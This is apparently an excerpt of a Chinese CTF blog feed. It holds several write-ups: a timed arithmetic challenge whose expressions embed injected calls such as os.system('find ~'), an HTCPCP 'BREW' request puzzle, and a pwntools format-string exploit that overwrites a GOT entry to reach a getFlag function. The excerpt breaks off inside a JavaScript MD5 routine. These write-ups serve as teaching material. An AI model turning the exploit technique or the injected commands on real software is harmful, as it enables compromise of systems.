class="line">a</span><br><span class="line">44a2b8</span><br><span class="line">a3d9b2c</span><br><span class="line">c44039</span><br><span class="line">f93345</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">2m3</span><br><span class="line">2m5</span><br><span class="line">2m1</span><br><span class="line">2</span><br><span class="line">s/4/t</span><br><span class="line">q</span><br><span class="line">q</span><br></pre></td></tr></table></figure></p><p>开始一直用<code>strings</code>,<code>cat</code>之类的命令来查看，以为可以，尝试各种组合，结果一直答案错误，然后队长说按照他这个提示自己输入就可以了，</p><p><img src="https://i.loli.net/2018/10/10/5bbd91a76cfdb.png" alt=""></p><p>保存为新的文件,打开看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;</span><br><span class="line">t4a2b8</span><br><span class="line">c44039</span><br><span class="line">f93345</span><br><span class="line">a3d9b2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>真的和之前的flag不一样了</p><p>flag:<code>flag{t4a2b8c44039f93345a3d9b2}</code></p><h2 id="猫咪克星"><a href="#猫咪克星" class="headerlink" title="猫咪克星"></a>猫咪克星</h2><p>题目就是连接nc,在30秒内算出所有的式子，写个脚本就可以全部解开，可是之后的式子就变了，变成下面的画风了<br><code>((int(6!=int(__import__(&#39;time&#39;).sleep(100)!=39))+(42*28))^((int(print(&#39;\x1b\x5b\x33\x3b\x4a\x1b\x5b\x48\x1b\x5b\x32\x4a&#39;)!=13)&amp;2)*(int(print(&#39;\x1b\x5b\x33\x3b\x4a\x1b\x5b\x48\x1b\x5b\x32\x4a&#39;)!=1)&lt;&lt;120)))</code></p><p><code>((int(17==55)|int(89!=int(18!=print(&#39;\x1b\x5b\x33\x3b\x4a\x1b\x5b\x48\x1b\x5b\x32\x4a&#39;))))&amp;((21|59)^(104&amp;1)))</code></p><p><code>int(((16^60)&amp;(3&gt;&gt;1))&gt;=(int(1!=int(9!=__import__(&#39;os&#39;).system(&#39;find ~&#39;)))+(37-9)))</code></p><p><code>(int((138&gt;&gt;int(__import__(&#39;os&#39;).system(&#39;find ~&#39;)==76))&lt;(int(15!=__import__(&#39;time&#39;).sleep(100))*int(12!=__import__(&#39;os&#39;).system(&#39;find ~&#39;))))*((int(1==exit())&lt;&lt;2)+(5&lt;&lt;int(6!=__import__(&#39;os&#39;).system(&#39;find ~&#39;)))))</code></p><p>如果直接eval()的话会报错，直接退出连接了，看起来不能让他执行这些命令，仔细观察这些式子发现都是<code>==</code>，<code>！=</code>来判断，所以把这些提取出来单独运行试试值为多少。再将这些结果替换为算出来的值就可以了,另外注意<code>sleep(100)</code>要改成<code>sleep(0)</code>,因为题目只限30s.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">r = remote(<span class="string">"202.38.95.46"</span>,<span class="number">12009</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    task = r.recvline()</span><br><span class="line">    print(task)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'sleep'</span>  <span class="keyword">in</span> str(task):</span><br><span class="line">        task = str(task)</span><br><span class="line">        task = task.replace(<span class="string">'sleep(100)'</span>,<span class="string">'sleep(0)'</span>)<span class="comment">#</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"转换后:"</span>+task</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> str(task):</span><br><span class="line">        task = str(task)</span><br><span class="line">        task = task.replace(<span class="string">'exit()'</span>,<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"转换后:"</span>+task</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'print'</span> <span class="keyword">in</span> str(task):</span><br><span class="line">        task = str(task)</span><br><span class="line">        task = task.replace(<span class="string">"print('\\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a')"</span>,<span class="string">'0'</span>)<span class="comment">#困扰很久，\x要转义\\x才可以替换</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"转换后"</span>+task</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'system'</span> <span class="keyword">in</span> str(task):</span><br><span class="line">        task = str(task)</span><br><span class="line">        task = task.replace(<span class="string">"__import__('os').system('find ~')"</span>,<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"转换后"</span>+task</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">    c = eval(task)</span><br><span class="line">    <span class="keyword">print</span> str(c)</span><br><span class="line">    r.sendline(str(c))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/10/5bbd8f2178a15.png" alt=""></p><p>flag:<code>flag{&#39;Life_1s_sh0rt_use_PYTH0N&#39;*1000}</code></p><h2 id="游园会的集章卡片"><a href="#游园会的集章卡片" class="headerlink" title="游园会的集章卡片"></a>游园会的集章卡片</h2><p>拼图<br><code>flag{H4PPY_1M4GE_PR0CE551NG}</code></p><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><h3 id="哲学思考"><a href="#哲学思考" class="headerlink" title="哲学思考"></a>哲学思考</h3><p>一开始无论提交什么都是</p><blockquote><p>I am not really sure whether your answer is right.<br>You should probably try again.</p></blockquote><p>直到仔细看到发送的数据包</p><p><img src="https://i.loli.net/2018/10/11/5bbf2883695b1.png" alt=""></p><p>他问我是谁，我是<code>TEAPOT</code>,喜提一枚flag<code>flag{i_canN0t_BReW_c0ffEE!}</code></p><h3 id="Can-I-help-me"><a href="#Can-I-help-me" class="headerlink" title="Can I help me"></a>Can I help me</h3><p>点开刚才给的<a href="http://202.38.95.46:12005/the_super_great_hidden_url_for_brewing_tea/" target="_blank" rel="noopener">url</a></p><blockquote><p>Brewing tea is not so easy.<br>Try using other methods to request this page.</p></blockquote><p>翻译过来就是</p><blockquote><p>泡茶不是那么容易。<br>尝试使用其他方法来请求此页面。</p></blockquote><p>果断改成POST,结果提示</p><blockquote><p>The method “POST” is deprecated.<br>See RFC-7168 for more information.</p></blockquote><p>谷歌到rfc-7168,<a href="http://www.ietf.org/rfc/rfc2324.txt,http://hczhcz.github.io/2014/04/02/htcpcp-for-tea.html" target="_blank" rel="noopener">http://www.ietf.org/rfc/rfc2324.txt,http://hczhcz.github.io/2014/04/02/htcpcp-for-tea.html</a></p><p>修改成<code>BREW</code>,再添加<code>Content-Type</code></p><p>请求:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BREW /the_super_great_hidden_url_for_brewing_tea/ HTTP/1.1</span><br><span class="line">Host: 202.38.95.46:12005</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://202.38.95.46:12005/identity</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: message/teapot</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure></p><p>响应:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 300 MULTIPLE CHOICES</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 19</span><br><span class="line">Alternates: &#123;&quot;/the_super_great_hidden_url_for_brewing_tea/black_tea&quot; &#123;type message/teapot&#125;&#125;</span><br><span class="line">Server: Werkzeug/0.14.1 Python/3.6.6</span><br><span class="line">Date: Thu, 11 Oct 2018 14:18:20 GMT</span><br><span class="line"></span><br><span class="line">Supported tea type:</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/10/11/5bbf5ca8ccb98.png" alt=""></p><p>把响应的url替换成brew的url,再发送</p><p><img src="https://i.loli.net/2018/10/11/5bbf5ca92ed19.png" alt=""></p><p>flag:<code>flag{delivering_tea_to_DaLa0}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.secpulse.com/archives/82450.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;文章首发安全脉搏&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn之路_repeater(山东省赛)</title>
    <link href="https://threst.github.io/2018/11/14/pwn_repeater/"/>
    <id>https://threst.github.io/2018/11/14/pwn_repeater/</id>
    <published>2018-11-14T01:50:13.000Z</published>
    <updated>2018-11-14T15:05:18.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h2><p>考点:格式化字符串漏洞</p><h2 id="pwntools知识点"><a href="#pwntools知识点" class="headerlink" title="pwntools知识点"></a>pwntools知识点</h2><p><code>fmtstr_payload</code>是<code>pwntools</code>提供的函数，用于自动生成格式化字符串。</p><p><code>fmtstr_payload</code>有两个参数,第一个参数是int，用于表示取参数的偏移个数,第二个参数是字典，字典的意义是往key的地址，写入value的值</p><p><code>fmtstr_payload(7, {printf_got: system_add})</code></p><p>这个函数调用会往<code>printf_got</code>中写入<code>system_add</code></p><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><p>此题为简单的格式化字符串漏洞，首先总览分析一下程序，循环受<code>totalcount</code>次数限制，初始值为1。</p><p><img src="https://www.superbed.cn/pic/5beae1459dc6d6bf0f3b6ff8" alt=""></p><p>程序提供了 <code>getFlag</code> 方法，但是需要变量 <code>number</code>为 <code>0x2018</code> 才会执行命令。</p><p><img src="https://www.superbed.cn/pic/5beae1459dc6d6bf0f3b6ff9" alt=""></p><h2 id="一个一个kill"><a href="#一个一个kill" class="headerlink" title="一个一个kill"></a>一个一个kill</h2><h3 id="totalcount"><a href="#totalcount" class="headerlink" title="totalcount"></a>totalcount</h3><p>接下来思路就很清晰了，首先改写<code>totalcount</code>变量，使得循环执行更多次。</p><p><img src="https://www.superbed.cn/pic/5beae4eb9dc6d6bf0f3b6ffa" alt=""></p><p><code>totalcount</code>的地址为<code>0x0804A064</code>,所以要将其修改为3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x0804A064:0x3&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="number"><a href="#number" class="headerlink" title="number"></a>number</h3><p>然后改写 number 为 <code>0x2018</code>。同样我们要在<code>.data</code>中寻找number的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x0804A060:0x2018&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>在最开始的图中我们可以知道，格式化字符串输出后就调用了<code>puts</code>函数，我们要做的就是将<code>puts</code>其地址修改为<code>getflag</code>函数的地址,最后调用 <code>getFlag</code>方法获取 Flag。</p><p>那么我们现在有了新问题，怎么找到<code>puts</code>的地址和<code>getflag</code>的地址？介绍两种方法</p><h4 id="方法1-puts"><a href="#方法1-puts" class="headerlink" title="方法1(puts)"></a>方法1(puts)</h4><p>使用<code>objdump -R repeater</code>命令</p><p><img src="https://www.superbed.cn/pic/5beae8ca9dc6d6bf0f3b6ffe" alt=""></p><p>地址为<code>0x0804a014</code></p><h4 id="方法2-puts"><a href="#方法2-puts" class="headerlink" title="方法2(puts)"></a>方法2(puts)</h4><p>ida找got表</p><p><img src="https://www.superbed.cn/pic/5beae93c9dc6d6bf0f3b6fff" alt=""></p><h4 id="getflag地址"><a href="#getflag地址" class="headerlink" title="getflag地址"></a>getflag地址</h4><p>直接ida打开就行</p><p><img src="https://www.superbed.cn/pic/5beae9d29dc6d6bf0f3b7001" alt=""></p><p>框框中的地址好像都可以用</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>好了现在我们有了<code>puts</code>的地址<code>0x0804a014</code>,<code>getflag</code>的地址<code>0x080485B6</code></p><p>脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x804a014:0x080485B6&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最后代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./repeater'</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x0804A064</span>:<span class="number">0x3</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x0804A060</span>:<span class="number">0x2018</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x804a014</span>:<span class="number">0x080485B6</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h2><h4 id="1-寻找偏移量"><a href="#1-寻找偏移量" class="headerlink" title="1.寻找偏移量"></a>1.寻找偏移量</h4><p>看输出判断,比如这个题的偏移量为４，我们这样来确定</p><p>输入<code>AAAA.%x.%x.%x.%x.%x.%x.%x</code>,查看打印的字符<code>41414141</code>在<code>AAAA</code>后面第几个偏移量就为多少,这个是第４个，所以偏移量为4.</p><p><img src="https://www.superbed.cn/pic/5beaec089dc6d6bf0f3b7003" alt=""></p><p>我们再来一个,源码来自ctf-wiki中格式化字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译下<code>gcc -m32 -fno-stack-protector -no-pie -o overflow overflow.c</code></p><p><img src="https://www.superbed.cn/pic/5beaed379dc6d6bf0f3b7006" alt=""></p><p>根据上面讲的，这个的偏移量就是6,我们尝试下修改<code>a</code>的值</p><p><img src="https://www.superbed.cn/pic/5beaedd49dc6d6bf0f3b7009" alt=""></p><p>首先找到<code>a</code>地址为<code>0x0804C024</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overflow'</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;<span class="number">0x0804C024</span>:<span class="number">0x2</span>&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://www.superbed.cn/pic/5beaeec59dc6d6bf0f3b700b" alt=""></p><p>成功修改,同理修改<code>b</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overflow'</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;<span class="number">0x0804C028</span>:<span class="number">0x12345678</span>&#125;)<span class="comment">#b的地址为28</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://www.superbed.cn/pic/5beaef279dc6d6bf0f3b700c" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;repeater&quot;&gt;&lt;a href=&quot;#repeater&quot; class=&quot;headerlink&quot; title=&quot;repeater&quot;&gt;&lt;/a&gt;repeater&lt;/h2&gt;&lt;p&gt;考点:格式化字符串漏洞&lt;/p&gt;
&lt;h2 id=&quot;pwntools知识点&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://threst.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>无处安放的wp(不定期更)</title>
    <link href="https://threst.github.io/2018/11/11/ctf/"/>
    <id>https://threst.github.io/2018/11/11/ctf/</id>
    <published>2018-11-11T06:32:13.000Z</published>
    <updated>2018-11-11T10:16:38.594Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tjctf"><a href="#tjctf" class="headerlink" title="tjctf"></a>tjctf</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> md5 = <span class="function"><span class="keyword">function</span> (<span class="params">string</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">RotateLeft</span>(<span class="params">lValue, iShiftBits</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> (lValue&lt;&lt;iShiftBits) | (lValue&gt;&gt;&gt;(<span class="number">32</span>-iShiftBits));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">AddUnsigned</span>(<span class="params">lX,lY</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">var</span> lX4,lY4,lX8,lY8,lResult;</span><br><span class="line">           lX8 = (lX &amp; <span class="number">0x80000000</span>);</span><br><span class="line">           lY8 = (lY &amp; <span class="number">0x80000000</span>);</span><br><span class="line">           lX4 = (lX &amp; <span class="number">0x40000000</span>);</span><br><span class="line">           lY4 = (lY &amp; <span class="number">0x40000000</span>);</span><br><span class="line">           lResult = (lX &amp; <span class="number">0x3FFFFFFF</span>)+(lY &amp; <span class="number">0x3FFFFFFF</span>);</span><br><span class="line">           <span class="keyword">if</span> (lX4 &amp; lY4) &#123;</span><br><span class="line">                   <span class="keyword">return</span> (lResult ^ <span class="number">0x80000000</span> ^ lX8 ^ lY8);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (lX4 | lY4) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (lResult &amp; <span class="number">0x40000000</span>) &#123;</span><br><span class="line">                           <span class="keyword">return</span> (lResult ^ <span class="number">0xC0000000</span> ^ lX8 ^ lY8);</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                           <span class="keyword">return</span> (lResult ^ <span class="number">0x40000000</span> ^ lX8 ^ lY8);</span><br><span class="line">                   &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> (lResult ^ lX8 ^ lY8);</span><br><span class="line">           &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params">x,y,z</span>) </span>&#123; <span class="keyword">return</span> (x &amp; y) | ((~x) &amp; z); &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">G</span>(<span class="params">x,y,z</span>) </span>&#123; <span class="keyword">return</span> (x &amp; z) | (y &amp; (~z)); &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">H</span>(<span class="params">x,y,z</span>) </span>&#123; <span class="keyword">return</span> (x ^ y ^ z); &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">I</span>(<span class="params">x,y,z</span>) </span>&#123; <span class="keyword">return</span> (y ^ (x | (~z))); &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">FF</span>(<span class="params">a,b,c,d,x,s,ac</span>) </span>&#123;</span><br><span class="line">           a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac));</span><br><span class="line">           <span class="keyword">return</span> AddUnsigned(RotateLeft(a, s), b);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">GG</span>(<span class="params">a,b,c,d,x,s,ac</span>) </span>&#123;</span><br><span class="line">           a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac));</span><br><span class="line">           <span class="keyword">return</span> AddUnsigned(RotateLeft(a, s), b);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">HH</span>(<span class="params">a,b,c,d,x,s,ac</span>) </span>&#123;</span><br><span class="line">           a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac));</span><br><span class="line">           <span class="keyword">return</span> AddUnsigned(RotateLeft(a, s), b);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">II</span>(<span class="params">a,b,c,d,x,s,ac</span>) </span>&#123;</span><br><span class="line">           a = AddUnsigned(a, 